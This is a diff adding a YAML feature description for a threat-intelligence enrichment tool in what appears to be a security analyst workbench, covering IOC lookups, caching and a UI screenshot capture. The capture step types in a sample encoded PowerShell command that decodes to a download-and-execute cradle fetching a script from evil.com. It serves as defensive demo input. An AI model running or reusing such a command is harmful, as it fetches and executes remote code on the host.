@@ -1,0 +1,40 @@
+id: threat_intel_enrichment
+title: Threat-Intel Enrichment
+category: Analyst Workbench
+audience: user
+purpose: Look up extracted IOCs against VirusTotal, AlienVault OTX, and AbuseIPDB
+  with 24-hour caching.
+when_to_use:
+- After decoding a payload that produces URLs / IPs / domains / file hashes
+- Before promoting an investigation to a customer-facing report
+supported_formats:
+- url
+- ipv4
+- domain
+- md5
+- sha1
+- sha256
+confidence_rules:
+- Aggregate verdict = MAX severity across providers
+- Missing API keys yield `no-key` verdicts (does not block other providers)
+tips:
+- Configure API keys in Admin → Threat-Intel Enrichment
+- Results are cached for 24 h — set `cache_ttl_hours` to tune
+related:
+- candidate_explorer
+- taxii_push
+capture:
+  login: true
+  steps:
+  - url: /workspace
+    wait_for: '[data-testid="input-textarea"]'
+    type_into:
+      selector: '[data-testid="input-textarea"]'
+      text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+    click_before: '[data-testid="btn-auto-investigate-inline"]'
+    delay_ms: 4000
+    post_click_ms: 6000
+    selectors:
+    - '[data-testid="input-card"]'
+    - '[data-testid="output-card"]'
+    - '[data-testid="threat-analysis-panel"]'
